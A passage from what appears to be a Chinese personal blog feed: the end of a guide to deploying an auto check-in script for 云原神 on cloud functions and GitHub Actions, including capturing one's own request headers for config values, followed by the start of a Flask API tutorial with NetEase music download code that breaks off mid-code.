href="https://cloud.tencent.com/act/cps/redirect?redirect=10232&cps_key=e6bd1a9d73067a5a66bb5c8e2a9e288c">腾讯云函数</a>，点左边的函数服务，然后顶上选择地区，随便选（但是最好是国内）</p><p>点击新建来建立一个新的函数</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Github/MHYY-AutoCheckin/msedge-20220421-170743.png"></p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Github/MHYY-AutoCheckin/msedge-20220421-170829.png"></p><p>函数的名称可以随便填，但是你也得符合腾讯云指定的规则；但是运行环境<strong>一定一定</strong>要选择<strong>Python 3.6</strong>（因为Python 3.7不带我们需要的环境，还需要自己装非常麻烦）</p><p>接着往下，提交方法选择<code>本地上传文件夹</code>，然后选择你刚刚解压的文件夹里面的<code>SCF</code>文件夹，接着重点来啦：执行方法里面填写为<code>index.handler</code>（一定要改）</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Github/MHYY-AutoCheckin/msedge-20220421-170913.png"></p><p>接着点击下面的触发器配置，选择<code>自定义创建</code>，触发方式选择<code>定时触发</code>，触发周期选择<code>每1天</code>，下面的<code>启用</code>要打勾，点击完成</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Github/MHYY-AutoCheckin/msedge-20220421-170929.png"></p><p>创建完成后进入配置界面，先点击顶上的<code>函数配置</code>，点击<code>编辑</code>，往下面拉找到<code>初始化超时时间</code>和<code>执行超时时间</code>，把这两个数字往高了调</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Github/MHYY-AutoCheckin/msedge-20220421-171310.png"></p><p>然后点击顶上的<code>函数代码</code>，等底下加载完后点击<code>config.json</code>，把你的信息填进去</p><p>然后打开终端，输入以下代码安装依赖</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x ./preinstall.sh &amp;&amp; ./preinstall.sh</span><br></pre></td></tr></table></figure><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Github/MHYY-AutoCheckin/msedge-20220421-171008.png"></p><p><strong>一定要先把配置丢进<code>config.json</code>再部署代码！一定要先把配置丢进<code>config.json</code>再部署代码！一定要先把配置丢进<code>config.json</code>再部署代码！</strong></p><p>往下拉，先点击<code>部署</code>，然后点<code>测试</code>，只要测试成功了就是部署完成了</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Github/MHYY-AutoCheckin/msedge-20220421-171039.png"></p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Github/MHYY-AutoCheckin/msedge-20220421-171404.png"></p><h4 id="其他云函数"><a href="#其他云函数" class="headerlink" title="其他云函数"></a>其他云函数</h4><p>其他的云函数有如下</p><ul><li><a href="https://www.huaweicloud.com/product/functiongraph.html?fromacct=19d30682-861b-4864-8dba-77e5a61b8f6f&utm_source=Z2FtZXJub3RpdGxl=&utm_medium=cps&utm_campaign=201905">华为云函数</a></li><li><a href="https://cloud.baidu.com/product/cfc.html">百度云函数</a>（找不到百度云的AFF页面在哪里所以没有推广链接）</li><li>其他……</li></ul><p>用法其实跟<a href="https://www.aliyun.com/product/fc?userCode=05u8nbft&share_source=copy_link">阿里云函数</a>和<a href="https://cloud.tencent.com/act/cps/redirect?redirect=10232&cps_key=e6bd1a9d73067a5a66bb5c8e2a9e288c">腾讯云函数</a>大差不差，看着用就行了，不会就开issue问</p><h3 id="配置解释（配置内容获取）"><a href="#配置解释（配置内容获取）" class="headerlink" title="配置解释（配置内容获取）"></a>配置解释（<a href="#%E9%85%8D%E7%BD%AE%E5%86%85%E5%AE%B9%E8%8E%B7%E5%8F%96">配置内容获取</a>）</h3><ul><li><code>token</code> 是在云原神登录后用于验证的token</li><li><code>type</code> （应该）是设备类型，安卓好像是<code>2</code>，iOS设备用户是<code>1</code>，<a href="#iOS%E8%AE%BE%E5%A4%87%E7%94%A8%E6%88%B7%E9%A1%BB%E7%9F%A5">但是目前还不支持iOS设备，请看这里</a></li><li><code>version</code> 是云原神的版本（<del>每次更新以后记得改一下，不然可能会出问题</del> 不用改了，现在改成从官方服务器获取版本号）</li><li><code>android</code> 安卓版本，例如我的红米K40的安卓版本是Android 12，就填入<code>12</code>，应该是只有Android有，因为手上只有Android设备，如果你愿意用iOS设备进行测试的话，请将相关内容发邮件到<a href="mailto:GamerNoTitle@outlook.com">GamerNoTitle@outlook.com</a></li><li><code>deviceid</code> 设备在米哈游注册的id（格式为UUID，例如<code>d76fb4b4-b898-4093-990d-c57ebb40f29b</code>）</li><li><code>devicename</code> 设备的名称</li><li><code>devicemodel</code> 设备的型号（<strong>请注意：<code>deviceid</code> <code>devicename</code> <code>devicemodel</code> 尽量是同一台手机的内容，因为指不定那天米忽悠就对这三个东西进行校验了</strong>，当然你要用公共的我也不阻止对吧）</li><li><code>appid</code> <strong>暂时不清楚</strong>，从我目前手上各用户提交的统计信息来看，好像是<code>云原神</code>这个应用在米哈游的应用id（貌似不会变）</li><li><code>analytics</code> 因为关于这个东西的信息太少，所以会把除了<code>token</code>以外的东西发送到我的云端服务器以便于分析，如果你不想分享你的信息（包括设备id、设备名称、设备型号等），请将这个设置为<code>false</code></li></ul><p>配置完成后，我们点开顶上的Actions，然后点绿色的那个按钮</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Github/MHYY-AutoCheckin/msedge-20220419-194540.png"></p><p>然后点击左侧列表中的两个脚本，点<code>Enable workflow</code>来启用</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Github/MHYY-AutoCheckin/msedge-20220419-194659.png"></p><p>然后我们点开左侧的<code>AutoCheckin</code>，然后点<code>Run workflow</code>来运行，只要运行结果打了绿色的勾勾就一般就没啥问题</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Github/MHYY-AutoCheckin/msedge-20220419-194812.png"></p><h3 id="自动保活"><a href="#自动保活" class="headerlink" title="自动保活"></a>自动保活</h3><div class="note warning flat"><p>事实上，对于现版本的Github Action，只需要把<code>KeepActionAlive</code>打开即可，下面的这些操作是旧版本的Action所需要的</p></div><p>因为Github在仓库没有push三个月后会停用仓库的一切Action，所以说我们需要进行保活。</p><p>在启用<code>KeepActionAlive</code>之前，你需要创建一个用来push更改的<code>GITHUB_TOKEN</code></p><p>右上角点击自己的头像，然后点击<code>Settings</code>，然后在左侧的导航栏找到<code>Developer Settings</code></p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Github/MHYY-AutoCheckin/msedge-20220822-204614.png"></p><p>然后在左边找到<code>Personal Access Tokens</code>，点击<code>Generate new token</code>生成一个token，名字填写为<code>GITHUB_TOKEN</code></p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Github/MHYY-AutoCheckin/msedge-20220822-204757.png"></p><p>把过期时间设置为<code>No expiration</code>，然后依次勾选下面内容</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Github/MHYY-AutoCheckin/msedge-20220822-205002.png"></p><p>然后点最下面的绿色按钮<code>Generate token</code>即可</p><p>在Action页面启用<code>KeppActionAlive</code>即可！脚本会在每个月的1号自动推送更新从而达到保活的目的。</p><h3 id="配置内容获取"><a href="#配置内容获取" class="headerlink" title="配置内容获取"></a>配置内容获取</h3><p>因为云原神是在手机上运行的，所以你需要安装一个手机上的抓包软件（例如HttpCanary，或者如果你能够用fiddler电脑运行去抓也行）</p><p><strong>一定要记得装抓包软件提供的证书，要不然解不了SSL连接，一定要先登录并成功进去了再启动抓包软件！！！</strong></p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Github/MHYY-AutoCheckin/HTTPCANARY-Result.jpg?download=true"></p><p>这里面只要是个HTTP链接，随便一个里面都有我们所需要的东西，这里我就点开了一个链接，在请求里面有所有我们需要的东西，而解释我都写在图片里面了</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Github/MHYY-AutoCheckin/HTTPS-REQUEST-RESULT.png?download=true"></p><p>其中，这里面的东西与变量有如下的对应关系</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;token&quot;</span><span class="punctuation">:</span> x-rpc-combo_token<span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> x-rpc-client_type<span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> x-rpc-app_version<span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;android&quot;</span><span class="punctuation">:</span> x-rpc-sys_version<span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;deviceid&quot;</span><span class="punctuation">:</span> x-rpc-device_id<span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;devicename&quot;</span><span class="punctuation">:</span> x-rpc-device_name<span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;devicemodel&quot;</span><span class="punctuation">:</span> x-rpc-device_model<span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;appid&quot;</span><span class="punctuation">:</span> x-rpc-app_id<span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;analytics&quot;</span><span class="punctuation">:</span> <span class="keyword">true</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><code>version</code>不是必要的，在<a href="https://github.com/ElainaMoe/MHYY-AutoCheckin/commit/7bd5d44e2411068e235c39879f187b67a33410dc"><code>a4e5f06..7bd5d44</code> commit</a>中，使用了米忽悠自己的api获取云原神的最新版本号，此处填写version只是作为获取不到最新版本号时的fallback值</p><p>对于<code>token</code>（应该说写作<code>token</code>念作<code>cookie</code>）由以下几部分组成：</p><ul><li><code>ai</code> 一个数值，具体含义未知</li><li><code>ci</code> 一个数值，具体含义未知</li><li><code>oi</code> 一个数值，推测是米游社ID</li><li><code>ct</code> 一串字符，具体作用未知，推测为认证使用</li><li><code>si</code> 一串字符，具体作用未知，推测为认证使用</li><li><code>bi</code> 一串字符，推测为服务器通道</li></ul><p>只要把对应的内容填到配置中即可！<strong>对于字符串类型的内容请使用双引号而不是单引号，json不认单引号（在错误收集中发现有此类现象，故特别提出）</strong></p><p>请不定时自己上线米哈云游（云原神）来清理签到的提醒消息，不然会一直堆积着，就要点好多次了</p><p>堆积的信息可以在运行结果中查看</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Github/MHYY-AutoCheckin/msedge-20220515-065323.png"></p><h3 id="iOS设备用户须知"><a href="#iOS设备用户须知" class="headerlink" title="iOS设备用户须知"></a>iOS设备用户须知</h3><p>因为米忽悠在请求头中的<code>cms-signature</code>键中写了用了<code>hmac-sha1</code>加密方法，这种加密方法需要<code>要加密的信息</code>和<code>密钥</code>，这两个东西我这边目前都不能确定（其实有<code>要加密的信息</code>就可以去猜密钥，但是目前不清楚是对什么进行了加密），而且在<code>CONTENT-MD5</code>中，还对请求的MD5进行了校验（这个好搞，主要是前面那个），最后还有一个时间<code>Date</code>的请求头（目前猜是发出请求的时间），总的来说就是不好搞，如果你手上是iOS设备，并且你愿意用iOS设备进行测试的话，请将相关内容发邮件到<a href="mailto:GamerNoTitle@outlook.com">GamerNoTitle@outlook.com</a>，最好是抓到的所有包都截图发一下（我好进行判断），并且抓多几次（感谢多玩幻灵qwq愿意与我共享他的抓包数据，这是我第一次收到iOS设备有关信息，谢谢你的共享:D）</p><p>已知iOS设备抓包会包含以下内容（以log获取为例）[感谢@多玩幻灵qwq在QQ给我提供的完整请求]</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Host: log-upload.mihoyo.com</span><br><span class="line">x-rpc-device_model: iPhone11,8&lt;表示iPhone的版本，可能会在新iPhone出来后变更，11,8表示从iPhone 11 ~ iPhone 8的设备（懒狗米忽悠）&gt;</span><br><span class="line">Cookie: account_id=&lt;猜测是米游社ID&gt;; cookie_token=&lt;认证用的Token&gt;; ltoken=&lt;认证用的Token+1&gt;; ltuid=&lt;米游社ID+1，应该跟account_id是一样的&gt;</span><br><span class="line">User-Agent: %E4%BA%91%C2%B7%E5%8E%9F%E7%A5%9E/24 CFNetwork/1331.0.7 Darwin/21.4.0（前面那里的URL解码后是&quot;云·原神&quot;）</span><br><span class="line">Referer: https://app.mihoyo.com</span><br><span class="line">x-rpc-device_name: iPhone</span><br><span class="line">cms-signature: hmac-sha1</span><br><span class="line">Content-Length: &lt;请求长度，暂时不知道怎么算的&gt;</span><br><span class="line">CONTENT-MD5: &lt;MD5校验值，暂时不知道是拿什么东西算的MD5&gt;</span><br><span class="line">Date: &lt;时间戳值，为请求发出时间&gt;</span><br><span class="line">x-rpc-combo_token: &lt;格式同Android抓包得到的格式&gt;</span><br><span class="line">x-rpc-channel: appstore</span><br><span class="line">x-rpc-app_version: &lt;云原神版本&gt;</span><br><span class="line">Authorization: &lt;身份认证Key，暂时不知道会不会变&gt;</span><br><span class="line">Accept-Language: zh-CN,zh-Hans;q=0.9</span><br><span class="line">Connection: keep-alive</span><br><span class="line">x-rpc-client_type: 1&lt;1表示iOS系列&gt;</span><br><span class="line">x-rpc-device_id: &lt;设备ID，格式为UUID5&gt;</span><br><span class="line">Accept: */*</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">x-rpc-sys_version: &lt;iOS版本&gt;</span><br></pre></td></tr></table></figure><h3 id="Q-amp-A"><a href="#Q-amp-A" class="headerlink" title="Q&amp;A"></a>Q&amp;A</h3><h4 id="青龙面板里面怎么用"><a href="#青龙面板里面怎么用" class="headerlink" title="青龙面板里面怎么用"></a>青龙面板里面怎么用</h4><p>使用Action版本，把配置写入<code>config.json</code>内，然后根据<a href="https://github.com/ElainaMoe/MHYY-AutoCheckin/issues/12#issuecomment-1224986933">这个链接</a>里面的做法对脚本进行小修改就可以用了</p><h4 id="为什么要把信息作为统计数据发到统计服务器？"><a href="#为什么要把信息作为统计数据发到统计服务器？" class="headerlink" title="为什么要把信息作为统计数据发到统计服务器？"></a>为什么要把信息作为统计数据发到统计服务器？</h4><p>因为我手头上的信息实在太少了，而且按照米忽悠的习惯，他们的数据如果没有庞大的数据量的话很难分析出一个所以然来，所以我这里需要大量的数据。如果你不想共享你的数据，请将配置中的<code>analytics</code>设置为<code>false</code>。</p><h4 id="SCF版本出现报错"><a href="#SCF版本出现报错" class="headerlink" title="SCF版本出现报错"></a>SCF版本出现报错</h4><p>报错内容为：<code>wait_time = random(1, 300) # Random wait time TypeError: &#39;module&#39; object is not callable</code></p><p>更新一下脚本就好了，在<a href="https://github.com/ElainaMoe/MHYY-AutoCheckin/commit/16650996cda2a3eca07c75993ed8b3f25540737e">commit</a><code>1665099</code>已经修好了（感谢<a href="https://github.com/Elletear">@Elletear</a>发现这个问题并提交<a href="https://github.com/ElainaMoe/MHYY-AutoCheckin/pull/5">PR#5</a>）</p><h4 id="发现了bug-x2F-无法使用"><a href="#发现了bug-x2F-无法使用" class="headerlink" title="发现了bug&#x2F;无法使用"></a>发现了bug&#x2F;无法使用</h4><p>请前往<a href="https://github.com/ElainaMoe/MHYY-AutoCheckin/issues">Issues · ElainaMoe&#x2F;MHYY-AutoCheckin (github.com)</a>发起新的issue来提出，不要在本页面的评论区提出问题（因为追踪性太差了）</p>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tech </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>用Python和Flask打造属于自己的API</title>
      <link href="/posts/API-FLASK/"/>
      <url>/posts/API-FLASK/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>先上api链接：<a href="https://api.ninym.top/">https://api.ninym.top</a></p><p>文档链接：<a href="https://ninym.top/">https://ninym.top</a></p><hr><h2 id="快速开始"><a href="#快速开始" class="headerlink" title="快速开始"></a>快速开始</h2><h3 id="环境安装"><a href="#环境安装" class="headerlink" title="环境安装"></a>环境安装</h3><p>首先既然是用python+flask，这两个东西肯定要装好的嘛~ Python的安装我就不讲了，主要说下flask</p><p>很简单，安装命令就一行</p><h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install flask</span><br></pre></td></tr></table></figure><h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install flask</span><br></pre></td></tr></table></figure><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/API-FLASK/Windows_PowerShell%20-%2020220419-105139.png?download=true"></p><p>因为我这里已经安装过了，所以写的是<code>Requirement already satisfied</code>，如果没有安装过的话会进入安装状态</p><h3 id="Hello-World"><a href="#Hello-World" class="headerlink" title="# Hello World"></a># Hello World</h3><p>既然要用flask框架，那就首先要引用，在python中，我们可以使用<code>import</code>语句来引用外部模块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br></pre></td></tr></table></figure><p>当然可以在后面加上<code>as xxx</code>给它取个别名（特别是对于那些名字很长的modules，下面会讲）</p><p>接下来我们创建我们的第一个flask程序</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parser</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&lt;h1&gt;Hello World!&lt;/h1&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8080</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>然后我们直接运行命令<code>python &lt;file&gt;.py</code>就可以运行我们的服务器了（Linux请使用<code>python3 &lt;file&gt;.py</code>，下面不再赘述，只讲Windows，Linux用户请自行替换）</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/API-FLASK/app.py_-_Flask-Demo_-_Visual_Studio_Code%20-%2020220419-105913.png?download=true"></p><p>然后我们在浏览器访问我们的网站，在这里可以使用<code>127.0.0.1:8080</code>访问，因为服务器就是部署在本机器上面的，打开后就会显示Hello World了</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/API-FLASK/j7jYPO4DxK.png?download=true"></p><p>注：图标是我的浏览器本地缓存，正常情况下网站是没有图标的（因为没有设置）</p><p>太棒啦，你现在已经学会创建Flask程序啦！</p><h3 id="我的Flask程序"><a href="#我的Flask程序" class="headerlink" title="我的Flask程序"></a>我的Flask程序</h3><h4 id="网易云音乐下载"><a href="#网易云音乐下载" class="headerlink" title="网易云音乐下载"></a>网易云音乐下载</h4><p>我在玩这个东西的过程中，主要是想把我的网易云音乐的API给重制一下（之前是用JavaScript写的烂代码，而且不会自动重命名，就想把这个功能完善一下），所以在我住院的期间，我就开始干起了这个东西。</p><p>首先先新建一个<code>utils</code>文件夹，里面放各种自制模块，然后新建了<code>NeteaseCloudMusic.py</code>来写我的这部分的代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> r</span><br><span class="line"><span class="keyword">import</span> bs4</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">NeteaseDownload</span>(<span class="params"><span class="built_in">id</span>, ContentType</span>):</span><br><span class="line">    <span class="keyword">if</span> ContentType == <span class="string">&#x27;attachment&#x27;</span>:</span><br><span class="line">        song, author = FileInfo(<span class="built_in">id</span>)</span><br><span class="line">        <span class="comment"># If the song id doesn&#x27;t map to a song, this will return.</span></span><br><span class="line">        <span class="keyword">if</span> song == <span class="literal">None</span> <span class="keyword">and</span> author == <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span>, <span class="string">&#x27;Not Found&#x27;</span>, <span class="string">&#x27;Not Found&#x27;</span></span><br><span class="line">        base = <span class="string">&#x27;https://music.163.com/song/media/outer/url?id=&#x27;</span></span><br><span class="line">        file = <span class="string">&#x27;./cache/&#x27;</span> + <span class="built_in">id</span> + <span class="string">&#x27;.mp3&#x27;</span></span><br><span class="line">        filename = <span class="built_in">id</span>+<span class="string">&#x27;.mp3&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> os.path.exists(file):</span><br><span class="line">            <span class="keyword">return</span> filename, song, author</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            stream = r.get(base + <span class="built_in">id</span>, timeout=<span class="number">30</span>)</span><br><span class="line">        <span class="keyword">except</span> TimeoutError:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span>, <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;u-errlg u-errlg-404&#x27;</span> <span class="keyword">in</span> stream.text:    <span class="comment"># Some VIP songs cannot be downloaded</span></span><br><span class="line">            <span class="built_in">print</span>(</span><br><span class="line">                <span class="string">&#x27;[NETEASEMUSICDOWNLOAD] Failed while getting the resources and information of a song.&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span>, <span class="number">404</span>, <span class="number">404</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[NETEASEMUSICDOWNLOAD] Getting song &#123;&#125; - &#123;&#125;, returned status_code &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(</span><br><span class="line">            author, song, stream.status_code))</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(stream.content)</span><br><span class="line">        <span class="keyword">return</span> filename, song, author</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        base = <span class="string">&#x27;https://music.163.com/song/media/outer/url?id=&#x27;</span></span><br><span class="line">        song, author = FileInfo(<span class="built_in">id</span>)</span><br><span class="line">        <span class="keyword">if</span> song == <span class="literal">None</span> <span class="keyword">and</span> author == <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> &#123;<span class="string">&#x27;code&#x27;</span>: -<span class="number">2</span>, <span class="string">&#x27;msg&#x27;</span>: <span class="string">&#x27;It seems that id &#123;&#125; is not a valid song id.&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">id</span>)&#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            stream = r.get(base + <span class="built_in">id</span>, timeout=<span class="number">30</span>)</span><br><span class="line">        <span class="keyword">except</span> TimeoutError:</span><br><span class="line">            <span class="keyword">return</span> &#123;<span class="string">&#x27;code&#x27;</span>: -<span class="number">3</span>, <span class="string">&#x27;msg&#x27;</span>: <span class="string">&#x27;Timed out. Please try again later.&#x27;</span>&#125;</span><br><span class="line">        <span class="keyword">if</span> stream.url == <span class="string">&quot;https://music.163.com/404&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> &#123;<span class="string">&#x27;code&#x27;</span>: <span class="number">500</span>, <span class="string">&#x27;link&#x27;</span>: <span class="literal">None</span>, <span class="string">&#x27;name&#x27;</span>: song, <span class="string">&#x27;author&#x27;</span>: author, <span class="string">&#x27;msg&#x27;</span>: <span class="string">&#x27;Cannot fetch download link.&#x27;</span>&#125;</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&#x27;code&#x27;</span>: <span class="number">200</span>, <span class="string">&#x27;link&#x27;</span>: stream.url, <span class="string">&#x27;name&#x27;</span>: song, <span class="string">&#x27;author&#x27;</span>: author, <span class="string">&#x27;msg&#x27;</span>: <span class="string">&#x27;Success&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">FileInfo</span>(<span class="params"><span class="built_in">id</span></span>):   <span class="comment"># Get the information of the song, including name and author</span></span><br><span class="line">    TargetWebInfo = r.get(<span class="string">&#x27;https://music.163.com/song?id=&#x27;</span> + <span class="built_in">id</span>)</span><br><span class="line">    html = TargetWebInfo.content</span><br><span class="line">    bf = bs4.BeautifulSoup(html, <span class="string">&quot;lxml&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        song = <span class="built_in">str</span>(<span class="built_in">list</span>(bf.find_all(<span class="string">&#x27;em&#x27;</span>, class_=<span class="string">&quot;f-ff2&quot;</span>))[<span class="number">0</span>])</span><br><span class="line">        song = song.replace(<span class="string">&#x27;&lt;em class=&quot;f-ff2&quot;&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;&lt;/em&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        ForbiddenCharacters = [(<span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27; &#x27;</span>), (<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27; &#x27;</span>), (<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;：&#x27;</span>),</span><br><span class="line">                               (<span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27; &#x27;</span>), (<span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;？&#x27;</span>), (<span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27; &#x27;</span>), (<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27; &#x27;</span>), (<span class="string">&#x27;|&#x27;</span>, <span class="string">&#x27;丨&#x27;</span>)]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> ForbiddenCharacters:</span><br><span class="line">            song = song.replace(i[<span class="number">0</span>], i[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        song = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        author = <span class="built_in">str</span>(<span class="built_in">list</span>(bf.find_all(<span class="string">&#x27;a&#x27;</span>, class_=<span class="string">&#x27;s-fc7&#x27;</span>))[<span class="number">1</span>])</span><br><span class="line">        ReplaceLink = re.findall(<span class="string">r&#x27;&lt;a class=&quot;s-fc7&quot; href=&quot;.+&quot;&gt;&#x27;</span>, author)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> ReplaceLink:</span><br><span class="line">            author = author.replace(i, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        author = author.replace(<span 